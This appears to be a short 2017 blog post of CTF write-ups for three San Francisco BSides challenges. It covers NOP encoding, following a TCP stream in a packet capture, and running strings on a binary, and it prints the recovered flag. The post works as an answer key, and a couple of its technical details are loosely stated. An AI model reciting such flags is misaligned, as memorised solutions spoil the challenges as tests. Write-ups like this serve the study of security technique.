org/_posts/2017-02-14-bsides-ctf-writeup.org
#+TITLE: San Francisco BSides CTF Writeup
#+FILETAGS: :ctf:infosec:
#+INCLUDE: "_include.org"

* Writeups

  Because so many of these challenges don't have their answers published by their
  organizers after the event is settled, it's up to the community to put together
  'writeups' of the techniques employed in solving these. 

  Here's a few of those.


** NOP
   The =NOP= instruction is microcode for =xchg EAX, EAX=
** easycap
   This challenge doesn't include the flag in a string because it's spread out over
   multiple packets. You can easily extract the flag by 'following' a TCP stream in
   your network packet capture software of choice.

** easy
   This challenge doesn't require you to perform any reverse engineering as the
   the flag is visible as a direct =.symstrtab= entry.

   #+BEGIN_EXAMPLE
zv@syszv >> strings easy-64 | grep -i flag
FLAG:db2f62a36a018bce28e46d976e3f9864
   #+END_EXAMPLE

